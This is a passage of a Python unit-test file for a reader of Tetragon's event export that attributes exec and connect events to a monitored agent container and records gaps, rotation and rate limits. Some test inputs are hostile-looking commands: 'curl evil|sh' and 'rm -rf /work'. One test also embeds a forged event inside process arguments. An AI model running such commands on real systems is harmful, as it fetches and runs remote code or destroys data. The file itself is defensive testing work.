"""Unit tests for backtide/sensors/tetragon.py: the reader of Tetragon's export file.

A real folder stands in for the sensor's ``events/`` and the tests play Tetragon: they append
lines and rotate the file the way it does (T07-1, P9: rename to ``tetragon-<time>.log``, then a
new ``tetragon.log`` with another inode; the oldest are deleted without a trace)."""

import copy
import json
import os
import threading
import time
from collections.abc import Callable
from dataclasses import dataclass, field, replace
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest

from backtide.blackbox.model import Source
from backtide.sensors import procs
from backtide.sensors.tetragon import ReaderConfig, SensorNotReady, TetragonReader, wait_ready

FIXTURES = Path(__file__).parent / "fixtures" / "tetragon"
TARGET_ID = "4978b4ee592382f24921acfc5822f6f33f7e95e6c89887f80dac399102aa2eff"
OPENCLAW_ID = "cf2e46aad38cd5637c8432bb0b97390b53971cd56bf006c35f92998e26d29188"
WALL = datetime(2026, 10, 17, 9, 46, tzinfo=UTC)  # right after the fixtures were captured


def fixture(name: str) -> dict[str, Any]:
    return json.loads((FIXTURES / f"{name}.json").read_text())


def exec_line(arguments: str, *, binary: str = "/bin/true", pid: int = 1601637) -> str:
    data = copy.deepcopy(fixture("exec_docker_exec"))
    process = data["process_exec"]["process"]
    process.update(arguments=arguments, binary=binary, pid=pid)
    return json.dumps(data)


def raw(name: str) -> str:
    return (FIXTURES / f"{name}.json").read_text().strip()


@dataclass
class Appended:
    source: str
    action: str
    target: str
    details: dict[str, Any]
    risk: int
    snapshot_id: str | None


@dataclass
class Box:
    """Stands in for BlackBox.append."""

    events: list[Appended] = field(default_factory=list)
    fail: bool = False

    def append(
        self,
        source: Source | str,
        action: str,
        target: str,
        *,
        details: Any = None,
        risk: int = 0,
        snapshot_id: str | None = None,
    ) -> object:
        if self.fail:
            raise OSError("disk full")
        self.events.append(
            Appended(str(source), action, target, dict(details or {}), risk, snapshot_id)
        )
        return None

    def of(self, source: str, action: str) -> list[Appended]:
        return [e for e in self.events if (e.source, e.action) == (source, action)]

    def argvs(self) -> list[str]:
        return [e.details["argv"] for e in self.of("exec", "exec")]

    def gaps(self, kind: str | None = None) -> list[dict[str, Any]]:
        return [
            e.details
            for e in self.of("system", "sensor_gap")
            if kind is None or e.details["kind"] == kind
        ]


class Clock:
    def __init__(self) -> None:
        self.now = 1000.0

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


class Tetragon:
    """Plays Tetragon on a folder: appends to tetragon.log and rotates it."""

    def __init__(self, events: Path) -> None:
        self.events = events
        self.rotations = 0
        events.mkdir(mode=0o700, exist_ok=True)

    @property
    def log(self) -> Path:
        return self.events / "tetragon.log"

    def write(self, *lines: str, end: str = "\n") -> None:
        with self.log.open("a") as f:
            f.write("".join(line + end for line in lines))

    def write_bytes(self, data: bytes) -> None:
        with self.log.open("ab") as f:
            f.write(data)

    def rotate(self) -> Path:
        self.rotations += 1
        stamp = f"2026-10-17T09-45-{self.rotations:02d}.139"
        rotated = self.events / f"tetragon-{stamp}.log"
        os.rename(self.log, rotated)
        self.log.touch()
        return rotated

    def rotated(self) -> list[Path]:
        return sorted(self.events.glob("tetragon-*.log"))


@pytest.fixture
def tetragon(tmp_path: Path) -> Tetragon:
    return Tetragon(tmp_path / "events")


@pytest.fixture
def box() -> Box:
    return Box()


@pytest.fixture
def clock() -> Clock:
    return Clock()


@pytest.fixture
def make_reader(
    tmp_path: Path, tetragon: Tetragon, box: Box, clock: Clock
) -> Callable[..., TetragonReader]:
    def make(**change: Any) -> TetragonReader:
        agent_id = change.pop("agent_id", TARGET_ID)
        snapshot_for = change.pop("snapshot_for", None)
        wall = change.pop("wall", lambda: WALL)
        already_recorded = change.pop("already_recorded", None)
        stale_probes_before = change.pop("stale_probes_before", None)
        config = ReaderConfig(
            events_dir=tetragon.events,
            cursor_file=tmp_path / "cursor.json",
            agent_name="backtide-agente",
        )
        return TetragonReader(
            replace(config, **change),
            box,
            agent_id=agent_id,
            snapshot_for=snapshot_for,
            already_recorded=already_recorded,
            stale_probes_before=stale_probes_before,
            clock=clock,
            wall=wall,
            sleep=lambda seconds: clock.advance(seconds),
        )

    return make


# --- reading --------------------------------------------------------------------------------


def test_records_the_agents_commands_with_their_container(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(raw("exec_docker_exec"), raw("exec_init_tree"), raw("exit_signal"))
    reader = make_reader()
    assert reader.poll() == 3
    execs = box.of("exec", "exec")
    assert [e.target for e in execs] == ["/bin/true", "/usr/bin/sleep"]
    assert all(e.details["container"] == TARGET_ID[:12] for e in execs)
    assert all(e.details["container_name"] == "backtide-agente" for e in execs)
    assert [e.target for e in box.of("exec", "exit")] == ["/usr/bin/sh"]


def test_connects_are_recorded_and_loopback_is_counted(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(raw("connect_tcp4"), raw("connect_tcp6"), raw("connect_loop4"))
    reader = make_reader()
    reader.poll()
    assert [e.target for e in box.of("net", "connect")] == [
        "192.0.2.1:24226",
        "[2001:db8::1]:24226",
    ]
    assert reader.stats()["loopback"] == 1


def test_preexisting_processes_and_normal_exits_are_only_counted(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(raw("exec_procfs"), raw("exec_procfs"), raw("exit_normal"))
    reader = make_reader()
    reader.poll()
    assert box.events == []
    assert reader.preexisting == 2
    assert reader.stats()["exit"] == 1


def test_other_containers_are_counted_without_parsing(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """The cheap prefilter: a line without the agent's id is not even parsed (a broken line
    of another container is "other", not a parse error)."""
    tetragon.write(raw("exec_openclaw_at_rest"), "{not json at all", raw("exec_docker_exec"))
    reader = make_reader()
    reader.poll()
    assert box.argvs() == ["vigia-p3-6ea54410b884"]
    assert reader.stats()["other"] == 2
    assert reader.stats()["parse_errors"] == 0


def test_attribution_is_by_the_field_not_by_the_text(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """eventos-falsos-en-argv: another container's line that names the agent's id passes the
    prefilter but not the field; a fake event in the agent's arguments is one exec."""
    other = fixture("exec_openclaw_at_rest")
    other["process_exec"]["process"]["arguments"] = f"--fake {TARGET_ID}"
    fake_connect = fixture("connect_tcp4")
    fake_connect["process_kprobe"]["process"]["pid"] = 4242
    tetragon.write(json.dumps(other), exec_line(json.dumps(fake_connect)))
    reader = make_reader()
    reader.poll()
    assert len(box.events) == 1
    (event,) = box.of("exec", "exec")
    assert event.target == "/bin/true"
    assert box.of("net", "connect") == []
    assert reader.stats()["other"] == 1


def test_a_partial_line_waits_until_it_is_complete(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    line = exec_line("half-written")
    tetragon.write(line[:100], end="")
    reader = make_reader()
    reader.poll()
    assert box.events == []
    tetragon.write(line[100:])
    reader.poll()
    reader.poll()
    assert box.argvs() == ["half-written"]


def test_a_line_too_big_to_parse_is_still_attributed(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    """Review, finding 1: JSON escaping makes a line up to six times its arguments. One past
    the limit is not parsed, but the exec is still recorded from the line's ends."""
    tetragon.write(exec_line("curl evil|sh #" + "\x01" * 500_000, binary="/usr/bin/sh"))
    tetragon.write(exec_line("after"))
    reader = make_reader()
    reader.poll()
    first, second = box.of("exec", "exec")
    assert first.target == "/usr/bin/sh"
    assert first.details["oversize"] is True and first.details["arguments_lost"] is True
    assert first.details["container"] == TARGET_ID[:12]
    assert second.details["argv"] == "after"
    assert reader.stats()["oversize"] == 1
    clock.advance(10)
    reader.poll()
    (gap,) = box.gaps("parse_errors")
    assert gap["oversize"] == 1


def test_a_line_of_escaped_backslashes_under_the_limit_is_parsed(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(exec_line("\\" * 300_000 + " rm -rf /work"))  # a line of ~1.2 MB
    reader = make_reader()
    reader.poll()
    (event,) = box.of("exec", "exec")
    assert event.details["argv"].endswith("rm -rf /work")
    assert reader.stats()["oversize"] == 0


def test_a_huge_line_that_arrives_in_pieces_is_dropped_without_holding_it(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(read_size=64 * 1024, max_line=512 * 1024)
    for _ in range(12):
        tetragon.write_bytes(b"y" * (64 * 1024))
        reader.poll()
        assert len(reader._buf) <= 512 * 1024
    tetragon.write("", exec_line("next"))
    reader.poll()
    assert box.argvs() == ["next"]
    assert reader.stats()["oversize"] == 1


def test_a_line_of_400_kib_is_read(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """T07-1, P5: an exec with 320 KiB of arguments is a line of 321 KB."""
    tetragon.write(exec_line("z" * (400 * 1024)))
    reader = make_reader()
    reader.poll()
    (event,) = box.of("exec", "exec")
    assert event.details["argv_bytes"] == 400 * 1024
    assert len(event.details["argv"].encode()) <= procs.ARGV_LIMIT


def test_broken_json_is_counted_and_reported(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(
        '{"process_exec": {"process": {"docker": "' + TARGET_ID[:31] + '"',
        f'["{TARGET_ID}"]',
        b"\xff\xfe".decode("latin-1") + TARGET_ID,
        raw("exec_docker_exec"),
    )
    reader = make_reader()
    reader.poll()
    assert reader.stats()["parse_errors"] == 3
    assert len(box.argvs()) == 1
    clock.advance(10)
    reader.poll()
    (gap,) = box.gaps("parse_errors")
    assert gap["count"] == 3
    assert box.of("system", "sensor_gap")[0].risk == 1
    clock.advance(10)
    reader.poll()
    assert len(box.gaps("parse_errors")) == 1  # reported once


def test_without_an_agent_nothing_is_attributed(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(raw("exec_docker_exec"))
    reader = make_reader(agent_id=None)
    reader.poll()
    assert box.events == [] and reader.stats()["other"] == 1
    reader.set_agent(TARGET_ID)
    tetragon.write(raw("exec_init_tree"))
    reader.poll()
    assert [e.target for e in box.of("exec", "exec")] == ["/usr/bin/sleep"]


def test_a_symlink_is_never_followed(
    tmp_path: Path, tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    planted = tmp_path / "planted.log"
    planted.write_text(raw("exec_docker_exec") + "\n")
    tetragon.log.symlink_to(planted)
    reader = make_reader()
    reader.poll()
    assert box.events == []


def test_the_snapshot_is_asked_with_the_kernels_time(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    asked: list[str | None] = []

    def snapshot_for(t: str | None) -> str | None:
        asked.append(t)
        return "20261017T094500Z-0001"

    tetragon.write(raw("exec_docker_exec"))
    make_reader(snapshot_for=snapshot_for).poll()
    assert asked == ["2026-10-17T09:45:23.220119379Z"]
    assert box.events[0].snapshot_id == "20261017T094500Z-0001"


def test_a_failing_black_box_is_counted_and_the_reader_goes_on(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(raw("exec_docker_exec"))
    box.fail = True
    reader = make_reader()
    reader.poll()
    assert reader.stats()["lost"] == 1
    box.fail = False
    tetragon.write(raw("exec_init_tree"))
    reader.poll()
    assert [e.target for e in box.of("exec", "exec")] == ["/usr/bin/sleep"]


def test_an_unreadable_folder_is_a_failure_once(
    tmp_path: Path, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(events_dir=tmp_path / "missing")
    reader.poll()
    reader.poll()
    (failed,) = box.of("system", "sensor_failed")
    assert failed.risk == 2 and failed.details["stage"] == "read"


def test_lag_is_warned_at_most_every_ten_minutes(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(wall=lambda: WALL + timedelta(minutes=5))
    tetragon.write(raw("exec_docker_exec"), raw("exec_init_tree"))
    reader.poll()
    (gap,) = box.gaps("lag")
    assert gap["seconds"] >= 60
    clock.advance(601)
    tetragon.write(raw("exec_init_tree"))
    reader.poll()
    assert len(box.gaps("lag")) == 2


# --- the cursor -----------------------------------------------------------------------------


def test_the_cursor_survives_a_restart_without_losing_or_repeating(
    tmp_path: Path, tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(exec_line("one"), exec_line("two"))
    first = make_reader()
    first.poll()
    tetragon.write(exec_line("three"), end="")  # half a line: never in the cursor
    first.poll()
    first.save_cursor()
    first.close()
    cursor = tmp_path / "cursor.json"
    assert oct(cursor.stat().st_mode & 0o777) == "0o600"
    tetragon.write("")
    tetragon.write(exec_line("four"))
    second = make_reader()
    second.poll()
    assert box.argvs() == ["one", "two", "three", "four"]


def test_rotation_finishes_the_old_file_first(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(exec_line("a"), exec_line("b"))
    reader = make_reader()
    reader.poll()
    tetragon.write(exec_line("c"))  # written right before the rotation, not read yet
    tetragon.rotate()
    tetragon.write(exec_line("d"))
    reader.poll()
    assert box.argvs() == ["a", "b", "c", "d"]
    assert box.gaps() == []


def test_rotation_while_stopped_resumes_the_old_file_by_inode(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(exec_line("a"))
    first = make_reader()
    first.poll()
    first.save_cursor()
    first.close()
    tetragon.write(exec_line("b"))
    tetragon.rotate()
    tetragon.write(exec_line("c"))
    tetragon.rotate()
    tetragon.write(exec_line("d"))
    make_reader().poll()
    assert box.argvs() == ["a", "b", "c", "d"]
    assert box.gaps() == []


def test_a_cursor_whose_file_is_gone_is_a_gap(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """Rotated away (8 times without being read): sensor_gap, and on from the oldest left."""
    tetragon.write(exec_line("a"))
    first = make_reader()
    first.poll()
    first.save_cursor()
    first.close()
    tetragon.write(exec_line("lost"))
    old = tetragon.rotate()
    tetragon.write(exec_line("kept"))
    tetragon.rotate()
    tetragon.write(exec_line("new"))
    old.unlink()  # the oldest goes first
    make_reader().poll()
    assert box.argvs() == ["a", "kept", "new"]
    (gap,) = box.gaps("rotated")
    assert gap["min_bytes"] >= 0
    assert box.of("system", "sensor_gap")[0].risk == 2


def test_a_reused_inode_is_not_the_cursors_file(
    tmp_path: Path, tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(exec_line("a"), exec_line("b"))
    first = make_reader()
    first.poll()
    first.save_cursor()
    first.close()
    cursor = json.loads((tmp_path / "cursor.json").read_text())
    # Another file with the same inode number: rewrite the active file in place.
    tetragon.log.write_text(exec_line("other") + "\n" + exec_line("content") + "\n")
    assert os.stat(tetragon.log).st_ino == cursor["inode"]
    make_reader().poll()
    assert box.argvs() == ["a", "b", "other", "content"]
    assert len(box.gaps("rotated")) == 1


def test_a_corrupt_cursor_starts_from_the_oldest_and_says_so(
    tmp_path: Path, tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    (tmp_path / "cursor.json").write_text("{nonsense")
    tetragon.write(exec_line("a"))
    make_reader().poll()
    assert box.argvs() == ["a"]
    (gap,) = box.gaps("cursor_invalid")
    assert "error" in gap


def test_a_rotated_file_deleted_before_it_was_read_is_a_gap(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(exec_line("a"))
    reader = make_reader(max_bytes_per_poll=1)  # one tiny read per poll: the reader lags
    tetragon.write(exec_line("b"))
    first = tetragon.rotate()
    tetragon.write(exec_line("c"))
    second = tetragon.rotate()
    tetragon.write(exec_line("d"))
    reader.poll()  # reads one byte of the oldest file and learns about the others
    second.unlink()
    for _ in range(5000):
        reader.poll()
    assert first.exists()
    assert box.argvs() == ["a", "b", "d"]
    (gap,) = box.gaps("rotated")
    assert gap["files"] == 1 and gap["min_bytes"] > 0


def test_a_truncated_file_is_read_again_from_the_start(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(exec_line("a"), exec_line("b"))
    reader = make_reader()
    reader.poll()
    tetragon.log.write_text(exec_line("c") + "\n")
    reader.poll()
    reader.poll()
    assert box.argvs() == ["a", "b", "c"]
    assert len(box.gaps("truncated")) == 1


# --- rate limits ----------------------------------------------------------------------------


def test_a_burst_is_folded_into_one_summary_every_ten_seconds(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(exec_rate=0.001, exec_burst=3)
    tetragon.write(*(exec_line(f"n{i}", binary=f"/usr/bin/b{i % 2}") for i in range(10)))
    reader.poll()
    assert box.argvs() == ["n0", "n1", "n2"]
    assert box.of("exec", "summary") == []  # not before 10 s
    clock.advance(10)
    reader.poll()
    (summary,) = box.of("exec", "summary")
    assert summary.target == "agent"
    assert summary.details["folded"] == 7
    assert summary.details["counts"] == {"exec": 7}
    assert {b["binary"]: b["count"] for b in summary.details["top_binaries"]} == {
        "/usr/bin/b1": 4,
        "/usr/bin/b0": 3,
    }
    assert summary.details["top_parents"] == [
        {"binary": "/usr/bin/containerd-shim-runc-v2", "count": 7}
    ]
    assert summary.details["window"]["from"].startswith("2026-10-17T09:45:23")
    clock.advance(10)
    reader.poll()
    assert len(box.of("exec", "summary")) == 1  # nothing new folded


def test_the_summary_carries_the_snapshot_of_the_first_folded_command(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    ids = iter(["s1", "s2", "s3", "s4"])
    reader = make_reader(exec_rate=0.001, exec_burst=1, snapshot_for=lambda t: next(ids))
    tetragon.write(exec_line("a"), exec_line("b"), exec_line("c"))
    reader.poll()
    clock.advance(10)
    reader.poll()
    assert box.of("exec", "summary")[0].snapshot_id == "s2"


def test_connects_have_their_own_bucket(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(exec_rate=0.001, exec_burst=1, net_rate=0.001, net_burst=2)
    tetragon.write(
        exec_line("a"),
        exec_line("b"),
        raw("connect_tcp4"),
        raw("connect_tcp6"),
        raw("connect_udp4"),
    )
    reader.poll()
    assert box.argvs() == ["a"]
    assert len(box.of("net", "connect")) == 2
    clock.advance(10)
    reader.poll()
    (net_summary,) = box.of("net", "summary")
    assert net_summary.details["folded"] == 1
    assert net_summary.details["top_targets"] == [{"target": "192.0.2.1:24226", "count": 1}]


def test_the_daily_budget_leaves_only_summaries_and_one_warning(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(exec_daily=2)
    tetragon.write(*(exec_line(f"n{i}") for i in range(5)))
    reader.poll()
    tetragon.write(exec_line("later"))
    clock.advance(10)
    reader.poll()
    assert box.argvs() == ["n0", "n1"]
    (warning,) = box.gaps("budget")
    assert warning["class"] == "exec"
    assert box.of("exec", "summary")[0].details["folded"] == 4
    clock.advance(24 * 3600)
    tetragon.write(exec_line("next day"))
    reader.poll()
    assert box.argvs()[-1] == "next day"


def test_stop_writes_the_last_summary(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(exec_rate=0.001, exec_burst=1)
    tetragon.write(exec_line("a"), exec_line("b"))
    reader.poll()
    reader.stop()
    assert box.of("exec", "summary")[0].details["folded"] == 1


# --- throttle -------------------------------------------------------------------------------


def test_throttle_becomes_a_gap_with_its_window(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(raw("throttle_start"), raw("throttle_stop"))
    make_reader().poll()
    start, stop = box.gaps("throttle")
    assert start == {
        "kind": "throttle",
        "state": "start",
        "since": "2026-10-17T09:45:40.166022589Z",
    }
    assert stop["state"] == "stop"
    assert stop["since"] == "2026-10-17T09:45:40.166022589Z"
    assert stop["until"] == "2026-10-17T09:45:45.509600984Z"


def test_another_containers_throttle_is_not_the_agents(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(raw("throttle_start"))
    make_reader(agent_id=OPENCLAW_ID).poll()
    assert box.events == []


# --- probes: readiness and heartbeat --------------------------------------------------------


def test_an_expected_probe_is_consumed_once_and_never_recorded(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader()
    nonce = procs.new_nonce("hb")
    reader.expect(nonce)
    tetragon.write(exec_line(nonce))
    reader.poll()
    assert reader.seen(nonce)
    assert box.events == []
    tetragon.write(exec_line(nonce))  # the same nonce again: not expected any more
    reader.poll()
    assert box.argvs() == [nonce]


def test_an_unexpected_probe_is_recorded(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader()
    nonce = procs.new_nonce("hb")
    tetragon.write(exec_line(nonce))
    reader.poll()
    assert box.argvs() == [nonce] and not reader.seen(nonce)


def test_expected_probes_expire(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader()
    nonce = procs.new_nonce("hb")
    reader.expect(nonce)
    clock.advance(121)
    tetragon.write(exec_line(nonce))
    reader.poll()
    assert box.argvs() == [nonce]


def test_expect_refuses_anything_but_a_nonce(make_reader: Callable[..., TetragonReader]) -> None:
    with pytest.raises(ValueError):
        make_reader().expect("init")


def test_wait_ready_returns_once_the_probe_is_seen(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader()
    launched: list[str] = []

    def launch(nonce: str) -> None:
        launched.append(nonce)
        if len(launched) == 3:  # the sensor "gets ready" at the third probe
            tetragon.write(exec_line(nonce))

    elapsed = wait_ready(reader, launch, timeout=30.0, interval=1.0)
    assert len(launched) == 3 and 0 <= elapsed <= 30.0
    assert box.events == []


def test_a_late_probe_still_counts(
    tetragon: Tetragon, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader()
    launched: list[str] = []

    def launch(nonce: str) -> None:
        launched.append(nonce)
        if len(launched) == 2:
            tetragon.write(exec_line(launched[0]))  # the first probe shows up late

    wait_ready(reader, launch, timeout=30.0, interval=1.0)
    assert len(launched) == 2


def test_wait_ready_gives_up_after_its_timeout(
    clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader()
    start = clock.now
    with pytest.raises(SensorNotReady):
        wait_ready(reader, lambda nonce: None, timeout=30.0, interval=1.0)
    assert 30.0 <= clock.now - start < 32.0


# --- the thread ------------------------------------------------------------------------------


def test_the_thread_reads_and_stop_saves_the_cursor(tmp_path: Path, tetragon: Tetragon) -> None:
    box = Box()
    config = ReaderConfig(
        events_dir=tetragon.events,
        cursor_file=tmp_path / "cursor.json",
        agent_name="backtide-agente",
        poll_interval=0.01,
    )
    reader = TetragonReader(config, box, agent_id=TARGET_ID, wall=lambda: WALL)
    reader.start()
    try:
        tetragon.write(exec_line("threaded"))
        deadline = time.monotonic() + 5
        while not box.events and time.monotonic() < deadline:
            time.sleep(0.01)
    finally:
        reader.stop()
    assert box.argvs() == ["threaded"]
    cursor = json.loads((tmp_path / "cursor.json").read_text())
    assert cursor["offset"] == tetragon.log.stat().st_size
    assert not [t for t in threading.enumerate() if t.name == "tetragon-reader"]


# --- review fixes ---------------------------------------------------------------------------


def test_a_reused_inode_of_a_file_already_read_is_read_again(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """Review, finding 2: on ext4 or XFS a deleted rotated file's inode comes back at once as
    the new tetragon.log. Played here by turning the old file into the new active one."""
    tetragon.write(exec_line("a"))
    old = tetragon.rotate()
    tetragon.write(exec_line("b"))
    reader = make_reader()
    reader.poll()
    assert box.argvs() == ["a", "b"]
    middle = tetragon.rotate()
    old.write_text("")  # the oldest is deleted, and its inode is the new active file
    os.rename(old, tetragon.log)
    tetragon.write(exec_line("c"))
    reader.poll()
    reader.poll()
    assert middle.exists()
    assert box.argvs() == ["a", "b", "c"]


def test_a_waiting_file_whose_inode_got_new_content_is_a_gap(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(exec_line("a"))
    waiting = None
    reader = make_reader(max_bytes_per_poll=1)
    tetragon.rotate()
    tetragon.write(exec_line("b"))
    waiting = tetragon.rotate()
    tetragon.write(exec_line("c"))
    reader.poll()  # on the oldest; the other two are waiting
    waiting.write_text(exec_line("replaced") + "\n")  # same inode, other file
    for _ in range(5000):
        reader.poll()
    (gap,) = box.gaps("rotated")
    assert gap["files"] == 1
    assert box.argvs() == ["a", "replaced", "c"]


def test_lines_of_the_replaced_container_are_still_the_agents(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    """Review, finding 5: the reader lags, the container is created again; its old lines
    still unread are not lost."""
    tetragon.write(raw("exec_docker_exec"))
    reader = make_reader()
    reader.set_agent(OPENCLAW_ID)
    tetragon.write(raw("exec_openclaw_at_rest"))
    reader.poll()
    assert [e.details["container"] for e in box.of("exec", "exec")] == [
        TARGET_ID[:12],
        OPENCLAW_ID[:12],
    ]
    clock.advance(601)
    tetragon.write(raw("exec_init_tree"))
    reader.poll()
    assert len(box.of("exec", "exec")) == 2
    assert reader.stats()["other"] == 1


def _procfs(start_time: str) -> str:
    data = fixture("exec_procfs")
    data["process_exec"]["process"]["start_time"] = start_time
    return json.dumps(data)


def test_processes_begun_while_the_sensor_was_down_are_recorded(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """Review, finding 6: after a restart of the sensor, procFS lines of processes that began
    after the last event seen are recorded (marked preexisting); older ones only counted."""
    tetragon.write(raw("exec_docker_exec"))  # the last event before the sensor went down
    tetragon.write(_procfs("2026-10-17T09:45:21.717563404Z"), _procfs("2026-10-17T09:50:00Z"))
    reader = make_reader()
    reader.poll()
    execs = box.of("exec", "exec")
    assert len(execs) == 2
    assert execs[1].details["preexisting"] is True
    assert execs[1].details["started"] == "2026-10-17T09:50:00Z"
    assert reader.preexisting == 2


def test_preexisting_processes_after_a_restart_of_backtide_use_the_cursors_time(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(raw("exec_docker_exec"))
    first = make_reader()
    first.poll()
    first.save_cursor()
    first.close()
    tetragon.write(_procfs("2026-10-17T09:50:00Z"))
    make_reader().poll()
    assert [e.details.get("preexisting") for e in box.of("exec", "exec")] == [None, True]


# --- a kill -9 of the service: read again, recorded once (T07-3) ------------------------------


def _keyed_exec(n: int, *, time_: str = "2026-10-17T09:45:23.220119379Z") -> str:
    """An exec of the agent with its own exec_id (the real ones are unique per process)."""
    data = copy.deepcopy(fixture("exec_docker_exec"))
    data["process_exec"]["process"].update(arguments=f"cmd-{n}", exec_id=f"ZXhlY2lk{n:08d}")
    data["time"] = time_
    return json.dumps(data)


def _recorded_keys(box: Box) -> Callable[[str | None], list[str]]:
    """What the service hands the reader: the keys of the sensor events in the black box."""

    def keys(since: str | None) -> list[str]:
        found = [procs.event_key(e.action, e.details) for e in box.events]
        return [key for key in found if key is not None]

    return keys


def test_after_a_kill_the_lines_read_again_are_not_recorded_twice(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """The cursor is saved every 5 s: a kill -9 of the service repeats what came after it."""
    tetragon.write(_keyed_exec(1), _keyed_exec(2))
    first = make_reader()
    first.poll()
    first.save_cursor()
    tetragon.write(_keyed_exec(3), _keyed_exec(4))
    first.poll()  # recorded, but killed before the next cursor
    first.close()
    tetragon.write(_keyed_exec(5))  # while the service was down
    second = make_reader(already_recorded=_recorded_keys(box))
    second.poll()
    assert box.argvs() == ["cmd-1", "cmd-2", "cmd-3", "cmd-4", "cmd-5"]
    assert second.stats()["duplicates"] == 2


def test_the_reader_asks_for_the_keys_since_the_cursors_time(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    asked: list[str | None] = []

    def keys(since: str | None) -> list[str]:
        asked.append(since)
        return []

    tetragon.write(_keyed_exec(1, time_="2026-10-17T09:45:30.5Z"))
    make_reader(already_recorded=keys).poll()  # no cursor yet: everything is a candidate
    first = make_reader()
    first.poll()
    first.save_cursor()
    make_reader(already_recorded=keys).poll()
    assert asked == [None, "2026-10-17T09:45:30.5Z"]


def test_a_failing_lookup_never_loses_an_event(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    def broken(since: str | None) -> list[str]:
        raise OSError("the black box is busy")

    tetragon.write(_keyed_exec(1))
    reader = make_reader(already_recorded=broken)
    reader.poll()
    assert box.argvs() == ["cmd-1"]
    (failed,) = box.of("system", "sensor_failed")
    assert failed.details["stage"] == "dedupe"


def test_a_key_seen_again_after_the_replay_is_recorded(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """Each key in the black box stands for one line: it is skipped once, not forever."""
    tetragon.write(_keyed_exec(1))
    make_reader().poll()
    tetragon.write(_keyed_exec(1))  # Tetragon would never repeat an exec_id; still recorded
    reader = make_reader(already_recorded=_recorded_keys(box))
    reader.poll()
    assert box.argvs() == ["cmd-1", "cmd-1"]
    assert reader.stats()["duplicates"] == 1


def test_probes_of_an_earlier_run_are_not_recorded(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """A probe the killed service launched is not expected by the new one: it is not one of
    the agent's commands either. Only a probe from before this reader started is stale."""
    old, new = procs.new_nonce("hb"), procs.new_nonce("hb")
    late = json.loads(exec_line(new))
